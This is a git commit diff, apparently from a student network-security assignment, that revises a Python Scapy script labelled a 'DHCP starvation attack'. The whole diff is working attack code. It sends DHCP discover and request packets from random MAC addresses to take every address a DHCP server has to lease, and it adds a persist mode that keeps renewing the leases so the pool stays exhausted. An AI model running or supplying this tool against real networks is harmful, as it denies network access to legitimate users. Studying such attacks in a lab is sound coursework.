bd70900a8b3f3af9c66c160dc7d9e3883e78a9b1
didi <ymarashe@g.jct.ac.il>
2022-03-29 20:27:54 +0300

    tar 3

--- DHCPstarvation/DHCPstarvation.py
+++ DHCPstarvation/DHCPstarvation.py
@@ -12,6 +12,9 @@ from scapy.all import *
 IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
 count = 0
 
+# set seed
+random.seed(time.time())
+
 
 def validate_ip_address(address):
     """
@@ -41,53 +44,64 @@ def starve(args):
     if the -p check is true, will save clock for every ip address and will renew the
     dhcp request 5 seconds before the end of the clock
     """
+    delay = 0
     while True:
         mac = generate_mac_address()
         ip, lease_time = get_ip_address(mac, args)
         if ip:
             print("IP: " + ip)
+            delay = 0
+            if args.persist:
+                # save clock for every ip address and renew the dhcp request 5 seconds before the end of the clock
+                renewal_thread = Process(target=renew_and_maintain, args=(lease_time, ip, mac, args))
+                renewal_thread.start()
         else:
-            print("No IP address")
-            break
-        if args.persist:
-            # save clock for every ip address and renew the dhcp request 5 seconds before the end of the clock
-            renewal_thread = Process(target=renew, args=(lease_time, ip, mac, args))
-            renewal_thread.start()
-            renewal_thread.join()
-        print(count)
+            delay += 0.3
+
+        time.sleep(delay)
 
 
-def get_ip_address(mac, args) -> (str, str):
+def get_ip_address(mac, args) -> (str, int):
     """
     send the dhcp discover packet to the target
     """
     target = "255.255.255.255"
     if args.target:
         target = args.target
-    x_id = random.randint(0, 30000)
+    x_id = random.randint(0, 0xFFFFFFFF)
     # craft dhcp discover packet
     dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / IP(src="0.0.0.0", dst=target) / UDP(sport=68, dport=67) / BOOTP(
         op=1, chaddr=mac, xid=x_id) / DHCP(options=[("message-type", "discover"), ("end")])
 
     # send the dhcp discover packet
-    sendp(dhcp_discover, iface=args.iface, verbose=1)
-    offer = sniff(count=1, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, timeout=3)
-    time.sleep(2)
-    print(offer.show())
-    if offer:
+    sniffer = AsyncSniffer(count=2, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, iface=args.iface, timeout=2)
+    sniffer.start()
+    time.sleep(0.5)
+
+    sendp(dhcp_discover, iface=args.iface, verbose=0)
+    sniffer.join()
+    if len(sniffer.results) == 2:
+        offer = sniffer.results[1]
         # craft dhcp request packet
         dhcp_request = Ether(dst=offer.src, src=mac) / IP(src="0.0.0.0", dst=args.target) / UDP(sport=68, dport=67) / BOOTP(
             op=1, chaddr=mac, xid=x_id) / DHCP(options=[("message-type", "request"), ("requested_addr", offer.getlayer(BOOTP).yiaddr),
                                                          ("server_id", offer.getlayer(BOOTP).siaddr), ("end")])
 
-        scapy.sendp(dhcp_request, iface=args.iface, timeout=1, verbose=0)
-        ack = sniff(count=1, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, timeout=3)
-        if ack:
+        # send the dhcp request packet
+        sniffer = AsyncSniffer(count=2, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, iface=args.iface, timeout=2)
+        sniffer.start()
+        time.sleep(0.5)
+
+        sendp(dhcp_request, iface=args.iface, verbose=0)
+        sniffer.join()
+        if len(sniffer.results) == 2:
+            ack = sniffer.results[1]
             # return the ip address and the lease time
-            return offer.getlayer(BOOTP).yiaddr, offer.getlayer(BOOTP).options[-1][1]
+            return ack.getlayer(BOOTP).yiaddr, ack.getlayer(DHCP).options[2][1]
     return None, None
 
-def renew(lease_time, ip, mac, args):
+
+def renew_and_maintain(lease_time, ip, mac, args):
     """
     renew ip lease from dhcp server
     :param ip:
@@ -95,23 +109,35 @@ def renew(lease_time, ip, mac, args):
     :param args:
     :return:
     """
-    time.sleep(lease_time - 5)
+    time.sleep(30)
     target = "255.255.255.255"
     if args.target:
         target = args.target
+    x_id = random.randint(0, 0xFFFFFFFF)
     # craft dhcp renewal packet with the ip address
-    dhcp_renew = Ether(dst=mac, src=mac) / IP(src=ip, dst=target) / UDP(sport=68, dport=67) / BOOTP(op=1, chaddr=mac) / DHCP(
-        options=[("message-type", "request"), ("requested_addr", ip), ("end")])
-    # send the dhcp renewal packet
-    ack = srp1(dhcp_renew, iface=args.iface, timeout=1, verbose=0)
-    if ack:
+    dhcp_renew = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / IP(src=ip, dst=target) / UDP(sport=68, dport=67) / \
+                 BOOTP(op=1, chaddr=mac, xid=x_id) / DHCP(options=[("message-type", "request"), ("requested_addr", ip), ("end")])
+
+    # send the dhcp ack packet
+    sniffer = AsyncSniffer(count=2, lfilter=lambda x: BOOTP in x and x[BOOTP].xid == x_id, iface=args.iface, timeout=2)
+    sniffer.start()
+    time.sleep(0.5)
+
+    sendp(dhcp_renew, iface=args.iface, verbose=0)
+    sniffer.join()
+    if len(sniffer.results) == 2:
+        ack = sniffer.results[1]
         print("Renewed IP: " + ip)
+        lease_time = ack[DHCP].options[2][1]
+        renewal_thread = Process(target=renew_and_maintain, args=(lease_time, ip, mac, args))
+        renewal_thread.start()
+
 
 def main():
     # initialize argument parser for command line
     parser = argparse.ArgumentParser(description="DHCP starvation attack")
     parser.add_argument("-i", "--iface", help="Interface you wish to use", choices=get_if_list())
-    parser.add_argument("-p", "--persist", help="Renew the attack if about to end")
+    parser.add_argument("-p", "--persist", help="Renew the attack if about to end", action='store_true')
     parser.add_argument("-t", "--target", help="IP of target", type=validate_ip_address)
 
     args = parser.parse_args()
@@ -120,5 +146,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 
